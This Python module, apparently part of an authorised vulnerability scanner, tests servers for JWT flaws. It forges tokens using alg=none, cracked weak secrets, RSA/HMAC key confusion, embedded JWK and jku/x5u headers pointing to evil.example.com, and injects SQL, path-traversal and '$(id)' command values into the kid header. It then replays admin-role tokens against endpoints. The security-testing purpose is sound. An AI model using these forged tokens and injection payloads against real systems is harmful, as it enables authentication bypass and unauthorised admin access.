"""JWT (JSON Web Token) validator.

Detects JWT security issues: alg=none, weak HMAC secret, key confusion
(RSA public key as HMAC secret), JWK injection, kid injection, embedded
JWK, and expired/nbf bypass.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from typing import Any, Callable

from src.core.models import ValidationResult
from src.core.scoring import ScoringConfig, bounded_confidence
from src.execution.validators.config.scoring_config import DEFAULT_SCORING_CONFIG
from src.execution.validators.status import ValidationStatus

logger = logging.getLogger(__name__)

_WELL_KNOWN_JWT_PATHS: list[str] = [
    "/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/jwks.json",
    "/oauth/jwks",
    "/api/jwks",
    "/.well-known/jwks",
]

JWT_ALGORITHM_BYPASSES: list[dict[str, Any]] = [
    {"alg": "none", "label": "none_algorithm"},
    {"alg": "None", "label": "None_algorithm"},
    {"alg": "NONE", "label": "NONE_algorithm"},
    {"alg": "nOnE", "label": "nOnE_algorithm"},
]


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(data: str) -> bytes:
    """Base64url decode with padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _create_jwt(header: dict, payload: dict, secret: str = "secret") -> str:
    """Create a JWT with given header and payload."""
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    sig_b64 = _b64url_encode(signature)
    return f"{message}.{sig_b64}"


def _create_jwt_none(payload: dict) -> str:
    """Create a JWT with alg=none (no signature)."""
    header_b64 = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _create_jwt_weak_secret(payload: dict) -> str:
    """Create a JWT signed with a weak/guessable secret."""
    return _create_jwt({"alg": "HS256", "typ": "JWT"}, payload, "secret")


def _create_jwt_kid_injection(payload: dict) -> str:
    """Create a JWT with SQL injection in kid header."""
    header = {"alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT '1' --"}
    return _create_jwt(header, payload, "secret")


def _create_jwt_jwk_injection(payload: dict) -> str:
    """Create a JWT with embedded JWK (CVE-2018-0114)."""
    # Fake RSA public key for JWK injection
    fake_jwk = {
        "kty": "RSA",
        "n": "u1SU1Lh1n2iK1sT6n0kFj1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z",
        "e": "AQAB",
        "alg": "RS256",
    }
    header = {"alg": "RS256", "typ": "JWT", "jwk": fake_jwk}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."  # No signature


def _create_jwt_key_confusion(payload: dict, public_key_bytes: bytes | None = None) -> str:
    """Create a JWT using key confusion (RS256 -> HS256 with public key)."""
    if public_key_bytes:
        secret = public_key_bytes.decode()
    else:
        secret = "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC8kGa1pCJBjqow\n-----END PUBLIC KEY-----"
    return _create_jwt({"alg": "HS256", "typ": "JWT"}, payload, secret)


def _create_jwt_jku_injection(payload: dict) -> str:
    """Create a JWT with attacker-controlled jku header pointing to evil JWK endpoint."""
    header = {"alg": "RS256", "typ": "JWT", "jku": "http://evil.example.com/jwk.json"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _create_jwt_x5u_injection(payload: dict) -> str:
    """Create a JWT with attacker-controlled x5u header pointing to evil cert chain."""
    header = {"alg": "RS256", "typ": "JWT", "x5u": "http://evil.example.com/cert.pem"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."


def _create_jwt_typ_confusion(payload: dict) -> str:
    """Create a JWT with typ=none to test typ-based parser confusion."""
    header = {"alg": "HS256", "typ": "none"}
    return _create_jwt(header, payload, "secret")


JWT_PAYLOADS: list[dict[str, Any]] = [
    {
        "label": "jwt_alg_none",
        "description": "alg=none JWT",
        "create": _create_jwt_none,
    },
    {
        "label": "jwt_weak_secret",
        "description": "JWT with weak HMAC secret",
        "create": _create_jwt_weak_secret,
    },
    {
        "label": "jwt_kid_injection",
        "description": "JWT with SQL injection in kid",
        "create": _create_jwt_kid_injection,
    },
    {
        "label": "jwt_jwk_injection",
        "description": "JWT with embedded JWK",
        "create": _create_jwt_jwk_injection,
    },
    {
        "label": "jwt_key_confusion",
        "description": "JWT with algorithm key confusion",
        "create": _create_jwt_key_confusion,
    },
    {
        "label": "jwt_jku_injection",
        "description": "JWT with attacker-controlled jku header",
        "create": _create_jwt_jku_injection,
    },
    {
        "label": "jwt_x5u_injection",
        "description": "JWT with attacker-controlled x5u header",
        "create": _create_jwt_x5u_injection,
    },
    {
        "label": "jwt_typ_confusion",
        "description": "JWT with typ=none to test parser confusion",
        "create": _create_jwt_typ_confusion,
    },
]

def parse_jwt(token: str) -> dict[str, Any] | None:
    """Parse a JWT into header/payload/signature segments."""
    if not token or not isinstance(token, str):
        return None
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    try:
        header_bytes = _b64url_decode(parts[0])
        payload_bytes = _b64url_decode(parts[1])
    except (ValueError, TypeError, base64.binascii.Error):  # type: ignore[attr-defined]
        return None
    try:
        header = json.loads(header_bytes.decode("utf-8"))
        payload = json.loads(payload_bytes.decode("utf-8"))
    except (ValueError, UnicodeDecodeError):
        return None
    return {"header": header, "payload": payload, "signature_b64": parts[2]}


def detect_alg_none(token: str) -> bool:
    """Return True if the JWT header uses alg=none (case insensitive)."""
    parsed = parse_jwt(token)
    if not parsed:
        return False
    return str(parsed["header"].get("alg", "")).strip().lower() == "none"


def build_alg_none_token(token: str) -> str | None:
    """Rewrite a token's header to alg=none and zero the signature."""
    parsed = parse_jwt(token)
    if not parsed:
        return None
    header = dict(parsed["header"])
    header["alg"] = "none"
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
    new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
    new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
    return f"{new_header}.{new_payload}."


def _constant_time_compare(a: bytes, b: bytes) -> bool:
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y
    return result == 0


def sign_jwt_hmac(token: str, secret: str) -> str:
    """Sign a parsed JWT with HS256 and the given secret."""
    import hashlib
    import hmac

    parsed = parse_jwt(token)
    if not parsed:
        return ""
    header = dict(parsed["header"])
    header["alg"] = "HS256"
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
    new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
    new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
    signing_input = f"{new_header}.{new_payload}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode("ascii")
    return f"{new_header}.{new_payload}.{signature_b64}"


def crack_jwt_secret(
    token: str,
    *,
    candidate_secrets: list[str] | tuple[str, ...] | None = None,
) -> str | None:
    """Return the first secret that produces a matching HS256 signature."""
    parsed = parse_jwt(token)
    if not parsed:
        return None
    sig_b64 = parsed["signature_b64"]
    try:
        expected_signature = _b64url_decode(sig_b64)
    except (ValueError, TypeError, base64.binascii.Error):  # type: ignore[attr-defined]
        return None
    header = dict(parsed["header"])
    header["alg"] = "HS256"
    header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
    payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
    new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
    new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
    signing_input = f"{new_header}.{new_payload}".encode("ascii")
    for secret in candidate_secrets or ():
        import hashlib
        import hmac

        signature = hmac.new(
            secret.encode("utf-8"), signing_input, hashlib.sha256
        ).digest()
        if _constant_time_compare(signature, expected_signature):
            return secret
    return None


def _build_kid_injection_tokens(token: str) -> list[dict[str, str]]:
    """Build candidate kid injection header values."""
    parsed = parse_jwt(token)
    if not parsed:
        return []
    candidates = [
        ("../../../../dev/null", ""),
        ("/dev/null", ""),
        ("1' OR '1'='1", ""),
        ("' UNION SELECT 'secret' --", ""),
        ("$(id)", ""),
    ]
    tokens: list[dict[str, str]] = []
    for kid_value, _label in candidates:
        header = dict(parsed["header"])
        header["kid"] = kid_value
        header["alg"] = "HS256"
        header_bytes = json.dumps(header, separators=(",", ":")).encode("utf-8")
        payload_bytes = json.dumps(parsed["payload"], separators=(",", ":")).encode("utf-8")
        new_header = base64.urlsafe_b64encode(header_bytes).rstrip(b"=").decode("ascii")
        new_payload = base64.urlsafe_b64encode(payload_bytes).rstrip(b"=").decode("ascii")
        tokens.append({"header": new_header, "payload": new_payload, "kid": kid_value})
    return tokens


def _response_indicates_acceptance(
    response: dict[str, Any] | None, original_payload: dict[str, Any]
) -> bool:
    """Best-effort heuristic for whether the server accepted the candidate token."""
    if not response:
        return False
    status_code = int(response.get("status_code", 0) or 0)
    if status_code in (200, 201, 204):
        return True
    if status_code in (401, 403):
        return False
    body = (response.get("body") or "").lower()
    if "invalid" in body or "expired" in body or "unauthorized" in body:
        return False
    if status_code in (302, 303, 307):
        return True
    if status_code >= 500:
        return False
    return False


def validate_jwt_token(target: dict[str, Any], context: dict[str, Any]) -> ValidationResult:
    token = str(target.get("token") or context.get("token") or "")
    target_url = str(target.get("url", ""))
    in_scope = bool(context.get("in_scope", True))
    
    if token:
        candidate_secrets_raw = context.get("jwt_test_secrets")
        if isinstance(candidate_secrets_raw, (list, tuple)) and candidate_secrets_raw:
            candidate_secrets = [str(secret) for secret in candidate_secrets_raw]
        else:
            candidate_secrets = None

        evaluation = evaluate_jwt(
            token=token,
            scoring=DEFAULT_SCORING_CONFIG.get("jwt_weakness", ScoringConfig()),
            candidate_secrets=candidate_secrets,
            in_scope=in_scope,
        )
    else:
        evaluation = evaluate_jwt(
            endpoint=target_url,
            jwks_endpoint=context.get("jwks_endpoint"),
            scoring=ScoringConfig(),
            in_scope=in_scope,
        )
        
    item = {
        "url": target_url,
        "status": evaluation["status"],
        "confidence": evaluation["confidence"],
        "in_scope": in_scope,
        "scope_reason": "scope_evaluated" if in_scope else "scope_unavailable_or_out_of_scope",
        "evidence": evaluation["evidence"],
    }
    from src.execution.validators.validators.shared import to_validation_result
    return to_validation_result(item, validator="jwt_weakness", category="jwt_weakness")


BASE_JWT_PAYLOAD = {
    "sub": "test",
    "role": "admin",
    "iat": 1516239022,
    "exp": 9999999999,
}


def evaluate_jwt(
    *,
    token: str | None = None,
    endpoint: str | None = None,
    jwks_endpoint: str | None = None,
    scoring: ScoringConfig,
    candidate_secrets: list[str] | tuple[str, ...] | None = None,
    jwt_evaluate: Callable[[str], dict[str, Any]] | None = None,
    kid_evaluate: Callable[[str, str], dict[str, Any]] | None = None,
    http_request: Callable[[str, str, dict[str, str] | None], dict[str, Any]] | None = None,
    jwt_header_name: str = "Authorization",
    jwt_token_prefix: str = "Bearer ",
    in_scope: bool = True,
    known_public_key: str | None = None,
) -> dict[str, Any]:
    """Evaluate a JWT for common weaknesses (supports both active probing and offline checking)."""
    if token is not None:
        parsed = parse_jwt(token)
        if not parsed:
            return {
                "status": ValidationStatus.FAILED.value,
                "confidence": 0.0,
                "signals": [],
                "evidence": {"reason": "invalid_jwt"},
                "bonuses": [],
            }

        signals: list[str] = []
        bonuses: list[float] = []
        notes: list[str] = []
        accepted_tokens: list[dict[str, Any]] = []

        # 1) alg=none test.
        none_token = build_alg_none_token(token)
        if none_token and jwt_evaluate is not None and in_scope:
            response = jwt_evaluate(none_token)
            accepted = _response_indicates_acceptance(response, parsed["payload"])
            if accepted:
                signals.append("alg_none_accepted")
                bonuses.append(0.30)
                notes.append("Server accepted alg=none token.")
                accepted_tokens.append(
                    {"variant": "alg_none", "response": response, "token": none_token}
                )

        # 2) Weak secret cracking.
        cracked_secret = crack_jwt_secret(token, candidate_secrets=candidate_secrets)
        if cracked_secret:
            signals.append("weak_secret_cracked")
            bonuses.append(0.20)
            notes.append("JWT signature verified with a weak HMAC secret.")
            # Attempt to mint a forged token and replay it.
            forged = sign_jwt_hmac(token, cracked_secret)
            if forged and jwt_evaluate is not None and in_scope:
                response = jwt_evaluate(forged)
                accepted = _response_indicates_acceptance(response, parsed["payload"])
                if accepted:
                    signals.append("forged_token_accepted")
                    bonuses.append(0.10)
                    notes.append("Server accepted forged token signed with weak secret.")
                    accepted_tokens.append(
                        {
                            "variant": "forged_weak_secret",
                            "response": response,
                            "token": forged,
                            "secret": cracked_secret,
                        }
                    )

        # 3) kid injection.
        for candidate in _build_kid_injection_tokens(token):
            kid_value = candidate.pop("kid")
            token_str = ".".join(candidate.values()) + ".AAAA"
            if kid_evaluate is not None and in_scope:
                response = kid_evaluate(token_str, kid_value)
                accepted = _response_indicates_acceptance(response, parsed["payload"])
                if accepted:
                    signals.append("kid_injection")
                    bonuses.append(0.18)
                    notes.append(f"Server accepted kid injection: {kid_value}")
                    accepted_tokens.append(
                        {
                            "variant": "kid_injection",
                            "response": response,
                            "token": token_str,
                            "kid": kid_value,
                        }
                    )
                    break

        if signals and in_scope and accepted_tokens:
            status = ValidationStatus.CONFIRMED.value
        elif signals and in_scope:
            status = ValidationStatus.HEURISTIC.value
        elif signals:
            status = ValidationStatus.HEURISTIC.value
        else:
            status = ValidationStatus.INCONCLUSIVE.value

        confidence = bounded_confidence(
            base=scoring.base,
            cap=scoring.cap,
            bonuses=bonuses,
        )
        evidence = {
            "header": parsed["header"],
            "payload_keys": sorted(str(key) for key in parsed["payload"].keys()),
            "signals": signals,
            "notes": notes,
            "accepted_tokens": accepted_tokens,
        }
        return {
            "status": status,
            "confidence": confidence,
            "signals": signals,
            "evidence": evidence,
            "bonuses": bonuses,
        }

    signals = []
    bonuses = []
    notes = []
    responses = {}

    if http_request is None or not endpoint:
        return {
            "status": ValidationStatus.INCONCLUSIVE.value,
            "confidence": 0.0,
            "signals": [],
            "evidence": {"reason": "no_endpoint_or_callable"},
            "bonuses": [],
        }

    if in_scope:
        for case in JWT_PAYLOADS:
            label = case["label"]
            try:
                token_val = case["create"](BASE_JWT_PAYLOAD)
                if label == "jwt_key_confusion":
                    token_val = _create_jwt_key_confusion(BASE_JWT_PAYLOAD, known_public_key.encode() if known_public_key else None)
                headers = {jwt_header_name: f"{jwt_token_prefix}{token_val}"}
                resp = http_request("GET", f"{endpoint}/protected", headers)
                responses[label] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:150],
                }
                body = str(resp.get("body", "") or "").lower()
                if resp.get("status_code") not in (401, 403):
                    if resp.get("status_code") == 200:
                        signals.append(label)
                        bonuses.append(0.20)
                        notes.append(f"JWT {case['description']} accepted - vulnerability confirmed.")
                else:
                    # Check for error messages revealing JWT parsing
                    jwt_error_indicators = ["jwt", "token", "signature", "alg", "kid"]
                    if any(ind in body for ind in jwt_error_indicators):
                        signals.append(f"{label}_error_disclosure")
                        bonuses.append(0.05)
            except Exception:
                continue

        # Check JWKS endpoint exposure
        if jwks_endpoint:
            try:
                resp = http_request("GET", jwks_endpoint, None)
                responses["jwks_exposure"] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:200],
                }
                body = str(resp.get("body", "") or "")
                if resp.get("status_code") == 200 and "keys" in body:
                    signals.append("jwks_endpoint_exposed")
                    bonuses.append(0.08)
                    notes.append(f"JWKS endpoint exposed: {jwks_endpoint}")
            except Exception:
                pass

    if signals:
        high_risk = any(
            s in ("jwt_alg_none", "jwt_jwk_injection", "jwt_key_confusion")
            for s in signals
        )
        status = ValidationStatus.CONFIRMED.value if high_risk else ValidationStatus.HEURISTIC.value
    else:
        status = ValidationStatus.INCONCLUSIVE.value

    total_bonus = sum(bonuses)
    confidence = bounded_confidence(base=scoring.base, cap=scoring.cap, bonuses=[total_bonus] if total_bonus else None)

    evidence = {
        "endpoint": endpoint,
        "jwks_endpoint": jwks_endpoint,
        "signals": signals,
        "notes": notes,
        "responses": responses,
    }

    return {
        "status": status,
        "confidence": confidence,
        "signals": signals,
        "evidence": evidence,
        "bonuses": bonuses,
    }

